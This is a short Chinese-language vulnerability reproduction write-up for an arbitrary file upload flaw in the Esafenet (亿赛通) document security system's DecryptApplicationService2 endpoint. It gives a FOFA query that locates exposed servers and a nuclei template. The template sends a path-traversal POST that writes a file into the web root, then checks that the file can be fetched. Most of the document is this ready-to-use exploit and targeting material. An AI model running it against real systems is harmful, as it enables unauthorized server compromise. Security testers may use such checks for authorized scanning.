# 亿赛通-任意文件上传DecryptApplicationService2

### <font style="color:rgba(0, 0, 0, 0.85);">漏洞描述</font>
<font style="color:rgb(119, 119, 119);">亿赛通电子文档安全管理系统 DecryptApplicationService2 任意文件上传，攻击者可通过此漏洞获取服务器权限。</font>

### <font style="color:rgba(0, 0, 0, 0.85);">漏洞复现</font>
<font style="color:rgb(119, 119, 119);">1、fofa</font>

```plain
app="亿赛通-电子文档安全管理系统"
```

<font style="color:rgb(119, 119, 119);">2、nuclei</font>

```plain
id: yisaitong-decryptapplicationService2-fileupload

info:
  name: yisaitong-decryptapplicationService2-fileupload
  author: xxx
  severity: critical


variables:
  filename: '{{rand_base(4)}}'

http:
  - raw:
	  - |
		POST /CDGServer3/DecryptApplicationService2?fileId=../../../Progra~2/ESAFENET/CDocGuard+Server/tomcat64/webapps/CDGServer3/{{filename}}.txt HTTP/1.1
		Host: {{Hostname}}
		User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0

		{{randstr}}

	  - |
		GET /CDGServer3/{{filename}}.txt HTTP/1.1
		Host: {{Hostname}}
		User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0

	matchers:
	  - type: dsl
		dsl:
		  - "status_code_2 == 200 && contains((body_2), '{{randstr}}')"
```
